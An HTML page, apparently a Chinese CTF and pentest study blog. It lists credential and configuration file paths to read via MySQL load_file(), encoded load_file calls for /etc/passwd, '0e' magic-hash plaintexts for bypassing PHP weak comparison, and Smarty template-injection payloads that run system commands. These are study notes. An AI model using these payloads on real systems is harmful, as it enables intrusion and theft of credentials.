+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">load_file 常用路径信息（套用他人博客的）</span><br><span class="line"></span><br><span class="line"> WINDOWS下:</span><br><span class="line">c:/boot.ini          <span class="comment">//查看系统版本</span></span><br><span class="line">c:/windows/php.ini   <span class="comment">//php配置信息</span></span><br><span class="line">c:/windows/my.ini    <span class="comment">//MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</span></span><br><span class="line">c:/winnt/php.ini</span><br><span class="line">c:/winnt/my.ini</span><br><span class="line">c:\mysql\data\mysql\user.MYD  <span class="comment">//存储了mysql.user表中的数据库连接密码</span></span><br><span class="line">c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini  <span class="comment">//存储了虚拟主机网站路径和密码</span></span><br><span class="line">c:\Program Files\Serv-U\ServUDaemon.ini</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml  <span class="comment">//IIS配置文件</span></span><br><span class="line">c:\windows\repair\sam  <span class="comment">//存储了WINDOWS系统初次安装的密码</span></span><br><span class="line">c:\Program Files\ Serv-U\ServUAdmin.exe  <span class="comment">//6.0版本以前的serv-u管理员密码存储于此</span></span><br><span class="line">c:\Program Files\RhinoSoft.com\ServUDaemon.exe</span><br><span class="line">C:\Documents <span class="keyword">and</span> Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件</span><br><span class="line"><span class="comment">//存储了pcAnywhere的登陆 密码</span></span><br><span class="line">c:\Program Files\Apache Group\Apache\conf \httpd.conf 或C:\apache\conf \httpd.conf <span class="comment">//查看     WINDOWS系统apache文件</span></span><br><span class="line">c:/Resin-<span class="number">3.0</span>.<span class="number">14</span>/conf/resin.conf   <span class="comment">//查看jsp开发的网站 resin文件配置信息.</span></span><br><span class="line">c:/Resin/conf/resin.conf      /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机</span><br><span class="line">d:\APACHE\Apache2\conf\httpd.conf</span><br><span class="line">C:\Program Files\mysql\my.ini</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置</span><br><span class="line">C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</span><br><span class="line"></span><br><span class="line">LUNIX/UNIX 下:</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf <span class="comment">//apache2缺省配置文件</span></span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf <span class="comment">//虚拟网站设置</span></span><br><span class="line">/usr/local/app/php5/lib/php.ini <span class="comment">//PHP相关设置</span></span><br><span class="line">/etc/sysconfig/iptables <span class="comment">//从中得到防火墙规则策略</span></span><br><span class="line">/etc/httpd/conf/httpd.conf <span class="comment">// apache配置文件</span></span><br><span class="line">/etc/rsyncd.conf <span class="comment">//同步程序配置文件</span></span><br><span class="line">/etc/my.cnf <span class="comment">//mysql的配置文件</span></span><br><span class="line">/etc/redhat-release <span class="comment">//系统版本</span></span><br><span class="line">/etc/issue</span><br><span class="line">/etc/issue.net</span><br><span class="line">/usr/local/app/php5/lib/php.ini <span class="comment">//PHP相关设置</span></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf <span class="comment">//虚拟网站设置</span></span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件</span><br><span class="line">/usr/local/resin-<span class="number">3.0</span>.<span class="number">22</span>/conf/resin.conf  针对<span class="number">3.0</span>.<span class="number">22</span>的RESIN配置文件查看</span><br><span class="line">/usr/local/resin-pro-<span class="number">3.0</span>.<span class="number">22</span>/conf/resin.conf 同上</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件</span><br><span class="line">/usr/local/resin-<span class="number">3.0</span>.<span class="number">22</span>/conf/resin.conf  针对<span class="number">3.0</span>.<span class="number">22</span>的RESIN配置文件查看</span><br><span class="line">/usr/local/resin-pro-<span class="number">3.0</span>.<span class="number">22</span>/conf/resin.conf 同上</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</span><br><span class="line">/etc/sysconfig/iptables 查看防火墙策略</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">load_file</span>(<span class="title function_ invoke__">char</span>(<span class="number">47</span>)) 可以列出FreeBSD,Sunos系统根目录</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">replace</span>(<span class="title function_ invoke__">load_file</span>(<span class="number">0</span>×<span class="number">2</span>F6574632F706173737764),<span class="number">0</span>×<span class="number">3</span>c,<span class="number">0</span>×<span class="number">20</span>)</span><br><span class="line"><span class="title function_ invoke__">replace</span>(<span class="title function_ invoke__">load_file</span>(<span class="title function_ invoke__">char</span>(<span class="number">47</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">99</span>,<span class="number">47</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">119</span>,<span class="number">100</span>)),<span class="title function_ invoke__">char</span>(<span class="number">60</span>),<span class="title function_ invoke__">char</span>(<span class="number">32</span>))</span><br></pre></td></tr></table></figure>
+
+<div id="a6"></div>
+
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p><a target="_blank" rel="noopener" href="https://github.com/robertdavidgraham/masscan">Masscan</a>：端口扫描，应用协议<br><a target="_blank" rel="noopener" href="https://github.com/EnableSecurity/wafw00f">Wafw00f</a>：Web应用防护防火墙识别<br><a target="_blank" rel="noopener" href="https://nmap.org/book/install.html">Nmap</a>：端口扫描，应用协议，防火墙识别<br><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15288375/5970915#:~:text=XSS%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%88%A9%E7%94%A8%201%201%E3%80%81config.php%EF%BC%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E3%80%81%E5%AF%86%E7%A0%81%E3%80%81%E8%BF%98%E6%9C%89xss%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BF%E9%97%AE%E8%B7%AF%E5%BE%84%202%202%E3%80%81%E5%AF%BC%E5%85%A5sql%E6%96%87%E4%BB%B6%EF%BC%8C%E6%B5%8B%E8%AF%95%E7%9A%84%E6%97%B6%E5%80%99%E6%B2%A1%E6%B3%95%E5%AF%BC%E5%85%A5%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B0%B1%E6%89%8B%E5%8A%A8%E5%88%9B%E5%BB%BA%E4%BA%86%E6%95%B0%E6%8D%AE%E5%BA%93%203%203%E3%80%81%E6%9B%B4%E6%96%B0%E7%AB%99%E7%82%B9%E5%9F%9F%E5%90%8D%EF%BC%8C%E5%B0%86%E4%BD%9C%E8%80%85%E7%9A%84%E5%9F%9F%E5%90%8D%E6%9B%BF%E6%8D%A2%EF%BC%8C%E4%B8%80%E5%85%B1%E6%9C%89%E5%9B%9B%E5%A4%84%204,1%E3%80%81%E6%B3%A8%E5%86%8C%E4%B8%80%E4%B8%AA%E8%B4%A6%E6%88%B7%206%202%E3%80%81%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%207%203%E3%80%81%E9%85%8D%E7%BD%AE%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%EF%BC%8C%E6%A0%B9%E6%8D%AE%E9%9C%80%E8%A6%81%EF%BC%8C%E6%B7%BB%E5%8A%A0%E6%A8%A1%E5%9D%97%208%204%E3%80%81%E5%A4%8D%E5%88%B6script%E9%87%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%EF%BC%8C%E6%8F%92%E5%85%A5%E5%88%B0%E5%AD%98%E5%9C%A8xss%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%A1%B5%E9%9D%A2%20%E6%9B%B4%E5%A4%9A%E9%A1%B9%E7%9B%AE">搭建XSS平台</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/390067540">搭建XSS平台的方法2</a></p>
+<div id="a7"></div>
+
+<h1 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h1><p><a target="_blank" rel="noopener" href="https://www.yunsee.cn/">云悉指纹识别</a><br><a target="_blank" rel="noopener" href="https://github.com/Lucifer1993/cmsprint">CMS中间件指纹识别库</a></p>
+<div id="a8"></div>
+
+<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/seizer/p/17035706.html">flash框架漏洞</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/csnd/p/11807592.html">XSS跨站脚本攻击</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ichunqiu/p/9430969.html">Referer漏洞攻击汇总</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Blood_Pupil/article/details/88243391">渗透测试之中间件安全</a><br>Linux关机：poweroff</p>
+<div id="a9"></div>
+
+<h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><p>md5为0e开头的小字典如下<br>具体看这篇<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45897324/article/details/108961503">博客</a><br>简单来说就是哈希值为0</p>
+<h2 id="md5加密明文获得0e开头密文-amp-md5弱类型对比绕过"><a href="#md5加密明文获得0e开头密文-amp-md5弱类型对比绕过" class="headerlink" title="md5加密明文获得0e开头密文&amp;md5弱类型对比绕过"></a>md5加密明文获得0e开头密文&amp;md5弱类型对比绕过</h2><p>弱类型比较，注意了。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">明文</span><br><span class="line">密文</span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="sha1加密明文获得0e开头密文"><a href="#sha1加密明文获得0e开头密文" class="headerlink" title="sha1加密明文获得0e开头密文"></a>sha1加密明文获得0e开头密文</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">aaroZmOk</span><br><span class="line"><span class="number">0e66507019969427134894567494305185566735</span></span><br><span class="line">aaK1STfY</span><br><span class="line"><span class="number">0e76658526655756207688271159624026011393</span></span><br><span class="line">aaO8zKZF</span><br><span class="line"><span class="number">0e89257456677279068558073954252716165668</span></span><br><span class="line">aa3OFF9m</span><br><span class="line"><span class="number">0e36977786278517984959260394024281014729</span></span><br><span class="line"><span class="number">0e1290633704</span></span><br><span class="line"><span class="number">0e19985187802402577070739524195726831799</span></span><br><span class="line"><span class="number">10932435112</span></span><br><span class="line"><span class="number">0e07766915004133176347055865026311692244</span></span><br></pre></td></tr></table></figure>
+
+<div id="a10"></div>
+
+<h1 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h1><p>smarty模板注入漏洞</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">常用payload</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;/flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125; </span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;/flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat ../../../flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125; </span><br><span class="line">smarty中的&#123;<span class="keyword">if</span>&#125;标签中可以执行php语句</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">模板注入漏洞汇总-博客</a></p>
+</div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">矢幽武</div><div class="author-info__description">生灵造物，百力奋心<br>机遇自争，各凭本事<br>没有攻不破的系统 ，<br> 只有不努力的黑客</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">195</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">26</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/linxiao-wangchuan"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><b><font color="#e66b6d">威</font> <font color="#e66d98">武</font> <font color="#e66cc6">不</font> <font color="#cc6de6">屈</font> ,<font color="#9770e6">成</font> <font color="#6d93e6">为</font> <font color="#6fcde6">自</font> <font color="#72e6b6">己</font> <font color="#72e689">不败的</font> <font color="#99e670">信条</font>, <font color="#cde670">剑</font> <font color="#e6df72">走</font> <font color="#e6c073">偏</font> <font color="#e6a271">锋</font> ,<font color="#e6796f">缥</font> <font color="#e65454">缈</font> <font color="#e63333">孤</font> <font color="#e62c2c">鸿</font> <font color="#e60101">影</font> <font color="#e60101"> --孤志</font></b> <p align="center"><img src="https://haiyong.site/img/img-blog.csdnimg.cn/f7384c88956d4378b72e47548e19c9f8.gif" width="50" alt="mao"></p> <p align="center" style="color:yellow;font-weight:800">微信号：无</p> <p align="center" style="color:red;font-weight:800">QQ：无</p> -------------------------------- <p style="color:#5a1216;font-weight:800">每日更新指南：</p> <p style="color:#4d1018;font-weight:800">刷题/记录总知识一般会沿用上次的文档</p> <p style="color:#f03752;font-weight:800">学习新知将新开文档</p></div></div><div class="xpand" style="height:10px;"></div><canvas class="illo" width="800" height="800" style="max-width: 200px; max-height: 200px; touch-action: none; width: 640px; height: 640px;"></canvas><script src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/twopeople1.js"></script><script src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/zdog.dist.js"></script><script id="rendered-js" src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/twopeople.js"></script><style>.card-widget.card-announcement {
+margin: 0;
+align-items: center;
+justify-content: center;
+text-align: center;
+}
+canvas {
+display: block;
+margin: 0 auto;
+cursor: move;
+}</style><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/01/06/SEC-tool-0007/" title="SEC-工具-认识kali部分工具"><img src="/img/backgroude/b14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SEC-工具-认识kali部分工具"/></a><div class="content"><a class="title" href="/2024/01/06/SEC-tool-0007/" title="SEC-工具-认识kali部分工具">SEC-工具-认识kali部分工具</a><time datetime="2024-01-06T02:12:32.000Z" title="发表于 2024-01-06 10:12:32">2024-01-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/05/Linux-Server-Study-005/" title="kali虚拟机网卡配置"><img src="/img/backgroude/b41.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="kali虚拟机网卡配置"/></a><div class="content"><a class="title" href="/2024/01/05/Linux-Server-Study-005/" title="kali虚拟机网卡配置">kali虚拟机网卡配置</a><time datetime="2024-01-05T06:15:45.000Z" title="发表于 2024-01-05 14:15:45">2024-01-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/19/Interview-0001/" title="面试学习-渗透测试"><img src="/img/backgroude/b19.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="面试学习-渗透测试"/></a><div class="content"><a class="title" href="/2023/12/19/Interview-0001/" title="面试学习-渗透测试">面试学习-渗透测试</a><time datetime="2023-12-19T06:27:03.000Z" title="发表于 2023-12-19 14:27:03">2023-12-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/29/CTF-web-035/" title="CTF之Web习题--033--某赛题"><img src="/img/backgroude/b11.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF之Web习题--033--某赛题"/></a><div class="content"><a class="title" href="/2023/11/29/CTF-web-035/" title="CTF之Web习题--033--某赛题">CTF之Web习题--033--某赛题</a><time datetime="2023-11-29T00:19:08.000Z" title="发表于 2023-11-29 08:19:08">2023-11-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/13/CTF-web-book-003/" title="CTF之Web总结--协议/系统/环境"><img src="/img/backgroude/b43.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF之Web总结--协议/系统/环境"/></a><div class="content"><a class="title" href="/2023/10/13/CTF-web-book-003/" title="CTF之Web总结--协议/系统/环境">CTF之Web总结--协议/系统/环境</a><time datetime="2023-10-13T14:19:08.000Z" title="发表于 2023-10-13 22:19:08">2023-10-13</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            <a class="card-more-btn" href="/categories/" title="查看更多">
+    <i class="fas fa-angle-right"></i></a>
+            </div>
+            <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF%E8%B5%9B%E9%A2%98/"><span class="card-category-list-name">CTF赛题</span><span class="card-category-list-count">41</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF%E8%B5%9B%E9%A2%98/BUUCTF/"><span class="card-category-list-name">BUUCTF</span><span class="card-category-list-count">12</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF%E8%B5%9B%E9%A2%98/BUUCTF/misc/"><span class="card-category-list-name">misc</span><span class="card-category-list-count">1</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF%E8%B5%9B%E9%A2%98/CTFSHOW/"><span class="card-category-list-name">CTFSHOW</span><span class="card-category-list-count">6</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF%E8%B5%9B%E9%A2%98/DVWA/"><span class="card-category-list-name">DVWA</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF%E8%B5%9B%E9%A2%98/NSS/"><span class="card-category-list-name">NSS</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF%E8%B5%9B%E9%A2%98/%E7%9F%A5%E8%AF%86%E7%82%B9-misc/"><span class="card-category-list-name">知识点-misc</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF%E8%B5%9B%E9%A2%98/%E7%9F%A5%E8%AF%86%E7%82%B9-web/"><span class="card-category-list-name">知识点-web</span><span class="card-category-list-count">1</span></a></li></ul></li>
+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AD%89%E7%BA%A7%E8%80%83%E8%AF%95/" style="font-size: 1.28em; color: #99a0aa">计算机等级考试</a> <a href="/tags/nssctf/" style="font-size: 1.1em; color: #999">nssctf</a> <a href="/tags/%E5%AE%89%E6%8E%92/" style="font-size: 1.1em; color: #999">安排</a> <a href="/tags/Python/" style="font-size: 1.28em; color: #99a0aa">Python</a> <a href="/tags/CTF/" style="font-size: 1.1em; color: #999">CTF</a> <a href="/tags/%E6%84%9F%E6%83%B3/" style="font-size: 1.1em; color: #999">感想</a> <a href="/tags/%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/" style="font-size: 1.1em; color: #999">搭建环境</a> <a href="/tags/LNMP/" style="font-size: 1.14em; color: #999b9d">LNMP</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 1.32em; color: #99a2ae">靶场</a> <a href="/tags/%E5%B9%B4%E7%9B%AE%E6%A0%87/" style="font-size: 1.1em; color: #999">年目标</a> <a href="/tags/java/" style="font-size: 1.41em; color: #99a5b7">java</a> <a href="/tags/misc-book/" style="font-size: 1.1em; color: #999">misc-book</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 1.1em; color: #999">网络安全</a> <a href="/tags/sec%E9%87%8D%E7%82%B9/" style="font-size: 1.1em; color: #999">sec重点</a> <a href="/tags/web-tool/" style="font-size: 1.14em; color: #999b9d">web-tool</a> <a href="/tags/web/" style="font-size: 1.5em; color: #99a9bf">web</a> <a href="/tags/app%E4%BB%A3%E7%90%86/" style="font-size: 1.14em; color: #999b9d">app代理</a> <a href="/tags/Centos7/" style="font-size: 1.1em; color: #999">Centos7</a> <a href="/tags/tool/" style="font-size: 1.37em; color: #99a4b2">tool</a> <a href="/tags/css/" style="font-size: 1.19em; color: #999da1">css</a> <a href="/tags/Docker/" style="font-size: 1.1em; color: #999">Docker</a> <a href="/tags/Linux/" style="font-size: 1.32em; color: #99a2ae">Linux</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 1.19em; color: #999da1">工具</a> <a href="/tags/Server/" style="font-size: 1.23em; color: #999ea6">Server</a> <a href="/tags/git/" style="font-size: 1.1em; color: #999">git</a> <a href="/tags/ssh/" style="font-size: 1.1em; color: #999">ssh</a> <a href="/tags/DVWA/" style="font-size: 1.19em; color: #999da1">DVWA</a> <a href="/tags/buuctf/" style="font-size: 1.28em; color: #99a0aa">buuctf</a> <a href="/tags/leave/" style="font-size: 1.1em; color: #999">leave</a> <a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 1.14em; color: #999b9d">前端</a> <a href="/tags/%E7%BD%91%E7%AB%99%E6%97%A5%E5%BF%97/" style="font-size: 1.1em; color: #999">网站日志</a> <a href="/tags/%E8%AE%A1%E5%88%92/" style="font-size: 1.1em; color: #999">计划</a> <a href="/tags/%E9%9A%BE%E5%BA%A6%E5%B7%A8%E5%A4%A7/" style="font-size: 1.28em; color: #99a0aa">难度巨大</a> <a href="/tags/misc/" style="font-size: 1.19em; color: #999da1">misc</a> <a href="/tags/%E9%AA%87%E5%AE%A2/" style="font-size: 1.14em; color: #999b9d">骇客</a> <a href="/tags/web-book/" style="font-size: 1.19em; color: #999da1">web-book</a> <a href="/tags/MYSQL/" style="font-size: 1.1em; color: #999">MYSQL</a> <a href="/tags/html/" style="font-size: 1.23em; color: #999ea6">html</a> <a href="/tags/PHP/" style="font-size: 1.46em; color: #99a7bb">PHP</a> <a href="/tags/yum/" style="font-size: 1.1em; color: #999">yum</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/12/"><span class="card-archive-list-date">十二月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><span class="card-archive-list-count">4</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><span class="card-archive-list-count">15</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">33</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><span class="card-archive-list-count">10</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">195</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2023-01-22T00:00:00.000Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总字数 :</div><div class="item-count">430.2k</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-01-30T16:01:18.563Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By 矢幽武</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" 